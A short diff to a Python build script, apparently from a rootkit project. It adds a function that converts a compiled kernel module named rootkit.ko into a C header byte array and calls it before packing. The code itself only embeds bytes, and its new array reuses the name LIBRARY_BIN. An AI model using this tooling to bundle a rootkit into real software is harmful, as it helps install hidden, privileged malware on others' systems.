@@ -265,6 +265,15 @@ def embed_library():
         src.write(f"""#pragma once\n\n""")
         src.write(f"""static char LIBRARY_BIN[] ={"{"} {str_arr} {"}"};""")
 
+def embed_kernel_module():
+    with (open("./module/rootkit.ko","rb") as lib,
+          open("./src/main/modules/rootkit_bin.h","w") as src):
+        bytes_read = lib.read()
+        hex_arr = [hex(i) for i in bytes_read]
+        str_arr = ",".join(hex_arr)
+        src.write(f"""#pragma once\n\n""")
+        src.write(f"""static char LIBRARY_BIN[] ={"{"} {str_arr} {"}"};""")
+
 ############
 ## CONFIG ##
 ############
@@ -351,6 +360,7 @@ def pack(module):
 
 if __name__ =="__main__":
     embed_library()
+    embed_kernel_module()
     packed_file = pack(module)
 
     # DONE :)
